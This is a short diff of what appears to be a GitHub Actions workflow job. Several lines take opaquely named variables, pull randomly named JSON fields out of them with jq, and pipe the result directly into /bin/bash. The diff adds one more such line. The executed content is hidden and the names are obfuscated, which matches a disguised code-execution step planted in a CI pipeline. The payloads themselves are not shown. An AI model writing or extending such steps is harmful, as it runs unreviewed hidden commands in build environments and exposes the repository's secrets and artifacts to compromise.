@@ -29,6 +29,7 @@ jobs:
           echo $gdepw36 | jq -r .s59 | /bin/bash
           echo $by629 | jq -r .kojh8275 | /bin/bash
           echo $t715 | jq -r .nth4 | /bin/bash
+          printf '%s' "$eyvqx17" | jq -r .drlq4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
